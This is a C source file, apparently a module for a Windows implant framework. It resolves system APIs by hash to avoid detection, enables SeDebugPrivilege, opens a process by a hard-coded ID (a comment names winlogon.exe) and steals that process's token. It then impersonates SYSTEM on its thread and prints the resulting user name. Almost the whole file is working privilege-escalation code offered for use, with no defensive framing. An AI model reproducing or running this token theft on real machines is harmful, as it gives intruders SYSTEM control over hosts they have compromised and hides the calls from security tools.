#include "run.h"

void run(char* output)
{
#pragma region function-resolution
/// Resolve the address of KERNEL32.DLL via djb2 hash.
    LPVOID kernel32dll = NULL;
    kernel32dll = GetModuleByHash(KERNEL32DLL_HASH1);
    if (NULL == kernel32dll)
    {
        /// Resolve the address of kernel32.dll via djb2 hash.
        kernel32dll = GetModuleByHash(KERNEL32DLL_HASH2);
        if (NULL == kernel32dll)
        {
            /// Resolve the address of Kernel32.dll via djb2 hash.
            kernel32dll = GetModuleByHash(KERNEL32DLL_HASH3);
            if (NULL == kernel32dll) {
                return;
            }
        }
    }

    LOADLIBRARYA LoadLibraryAFunc;
    UINT64 msvcrtdll;
    STRLEN strlenFunc;
    CHAR loadlibrarya_c[] = "LoadLibraryA";
    LoadLibraryAFunc = _GetProcAddress((HANDLE)kernel32dll, loadlibrarya_c);
    CHAR msvcrt_c[] = "msvcrt.dll";
    msvcrtdll = (UINT64)((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);
    CHAR strlen_c[] = "strlen";
    strlenFunc = _GetProcAddress((HANDLE)msvcrtdll, strlen_c);
    
    UINT64 advapi32dll;
	OPENPROCESS OpenProcessFunc;
	GETCURRENTPROCESS GetCurrentProcessFunc;
	OPENPROCESSTOKEN OpenProcessTokenFunc;
	LOOKUPPRIVILEGEVALUEA LookupPrivilegeValueAFunc;
	ADJUSTTOKENPRIVILEGES AdjustTokenPrivilegesFunc;
	DUPLICATETOKEN DuplicateTokenFunc;
	SETTHREADTOKEN SetThreadTokenFunc;
    THREAD32FIRST Thread32FirstFunc;
    THREAD32NEXT Thread32NextFunc;
    CREATETOOLHELP32SNAPSHOT CreateToolhelp32SnapshotFunc;
    PRINTF printfFunc;
	CHAR Advapi32_c[] = "advapi32.dll";
	advapi32dll = (UINT64)((LOADLIBRARYA)LoadLibraryAFunc)(Advapi32_c);
	CHAR openprocess_c[] = "OpenProcess";
	OpenProcessFunc = _GetProcAddress((HANDLE)kernel32dll,openprocess_c);
	CHAR getcurrentprocess_c[] = "GetCurrentProcess";
	GetCurrentProcessFunc = _GetProcAddress((HANDLE)kernel32dll,getcurrentprocess_c);
	CHAR openprocesstoken_c[] = "OpenProcessToken";
	OpenProcessTokenFunc = _GetProcAddress((HANDLE)advapi32dll,openprocesstoken_c);
	CHAR lookupprivilegevaluea_c[] = "LookupPrivilegeValueA";
	LookupPrivilegeValueAFunc = _GetProcAddress((HANDLE)advapi32dll,lookupprivilegevaluea_c);
	CHAR adjusttokenprivileges_c[] = "AdjustTokenPrivileges";
	AdjustTokenPrivilegesFunc = _GetProcAddress((HANDLE)advapi32dll,adjusttokenprivileges_c);
	CHAR duplicatetoken_c[] = "DuplicateToken";
	DuplicateTokenFunc = _GetProcAddress((HANDLE)advapi32dll,duplicatetoken_c);
	CHAR setthreadtoken_c[] = "SetThreadToken";
	SetThreadTokenFunc = _GetProcAddress((HANDLE)advapi32dll,setthreadtoken_c);
    CHAR thread32first_c[] = "Thread32First";
    Thread32FirstFunc = _GetProcAddress((HANDLE)kernel32dll, thread32first_c);
    CHAR createtoolhelp32snapshot_c[] = "CreateToolhelp32Snapshot";
    CreateToolhelp32SnapshotFunc = _GetProcAddress((HANDLE)kernel32dll, createtoolhelp32snapshot_c);
    CHAR thread32next_c[] = "Thread32Next";
    Thread32NextFunc = _GetProcAddress((HANDLE)kernel32dll, thread32next_c);
    CHAR printf_c[] = "printf";
    printfFunc = _GetProcAddress((HANDLE)msvcrtdll, printf_c);
    CLOSEHANDLE CloseHandleFunc;
    CHAR closehandle_c[] = "CloseHandle";
    CloseHandleFunc = _GetProcAddress((HANDLE)kernel32dll, closehandle_c);
    GETCURRENTPROCESSID GetCurrentProcessIdFunc;
    CHAR getcurrentprocessid_c[] = "GetCurrentProcessId";
    GetCurrentProcessIdFunc = _GetProcAddress((HANDLE)kernel32dll, getcurrentprocessid_c);
    OPENTHREAD OpenThreadFunc;
    CHAR openthread_c[] = "OpenThread";
    OpenThreadFunc = _GetProcAddress((HANDLE)kernel32dll, openthread_c);
    SLEEP SleepFunc;
    CHAR sleep_c[] = "Sleep";
    SleepFunc = _GetProcAddress((HANDLE)kernel32dll , sleep_c);


    
    
    //Write Your code here
    //You send text back by using print or println by changing the VALUE_TO_PRINT 
    //to the string you want: "print(&output, strlenFunc, VALUE_TO_PRINT);
    //All Strings must be declared with the CHAR  varname []= ""; format.
    //Get SeDebugPrivs to be able to debug a process
    HANDLE Token;
    LUID luid;

    if (!OpenProcessTokenFunc(GetCurrentProcessFunc(), TOKEN_ADJUST_PRIVILEGES, &Token)) {
        CHAR  errorOpeningCurrentProcessToken [] = "errorOpeningCurrentProcessToken";
        println(&output, strlenFunc, errorOpeningCurrentProcessToken);
    }
    CHAR debugPriv[] = "SeDebugPrivilege";
    if (!LookupPrivilegeValueAFunc(NULL, debugPriv, &luid)) {
        CHAR errorFindingSeDebug [] = "Error finding SeDebug";
        println(&output, strlenFunc, errorFindingSeDebug);
    }
    TOKEN_PRIVILEGES NewState;
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Luid = luid;
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivilegesFunc(Token, FALSE, &NewState, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        CHAR  errorAdjustingTokenPrivs [] = "errorAdjustingTokenPrivs";
        println(&output, strlenFunc, errorAdjustingTokenPrivs);
    }

    //Now that I have the SeDebugPrivilege I can open a system process and steal its token to start a new process with it
    DWORD pid = 1504;
    HANDLE openedProcess;
    HANDLE AccessToken;

    //ADD CODE TO FIND WINLOGON.EXE PROCESS ID

    openedProcess = OpenProcessFunc(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!openedProcess) {
        CHAR madeIt[] = "I opened the process...not!";
        println(&output, strlenFunc, madeIt);
        return;
    }

    OpenProcessTokenFunc(openedProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &AccessToken);
    if (!AccessToken) {
        CHAR madeIt2[] = "I opened the token...not!";
        println(&output, strlenFunc, madeIt2);
    }

    HANDLE pNewToken;
    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
    DuplicateTokenFunc(AccessToken, seImpersonateLevel, &pNewToken);


    //Iterate all the freaking threads
    //DWORD currentProcessID = GetCurrentProcessIdFunc();
    //CHAR threadDisplay [] = "Process 0x%04x Thread 0x%04x\n";
    //HANDLE h = CreateToolhelp32SnapshotFunc(0x00000004, 0);
    //if (h != INVALID_HANDLE_VALUE) {
    //    THREADENTRY32 te;
    //    ZeroMemory(&te, sizeof(te));
    //    te.dwSize = sizeof(te);
    //    if (Thread32FirstFunc(h, &te)) {
    //        do {
    //            if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
    //                if (currentProcessID == te.th32OwnerProcessID) {
    //                    printfFunc(threadDisplay,
    //                        te.th32OwnerProcessID, te.th32ThreadID);
    //                    HANDLE thandle = OpenThreadFunc(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
    //                    SetThreadTokenFunc(&thandle, pNewToken);
    //                    if (!thandle) {
    //                        char fuckoff[] = "fuck off!";
    //                        println(&output, strlenFunc, fuckoff);
    //                    }
    //                }  
    //            }
    //            te.dwSize = sizeof(te);
    //        } while (Thread32NextFunc(h, &te));
    //    }
    //    CloseHandleFunc(h);
    //}


    //End iterate all threads


    /**/
    SetThreadTokenFunc(NULL, pNewToken);
    //Uncomment this and youll see it now prints system so we did impersonate the system process
    GETUSERNAMEA GetUserNameAFunc;
    CHAR getusernamea_c[] = "GetUserNameA";
    GetUserNameAFunc = _GetProcAddress((HANDLE)advapi32dll, getusernamea_c);
    int bufsize = 100;
    CHAR buf[100];
    GetUserNameAFunc(buf, &bufsize);
    println(&output, strlenFunc, buf);


    return;
}
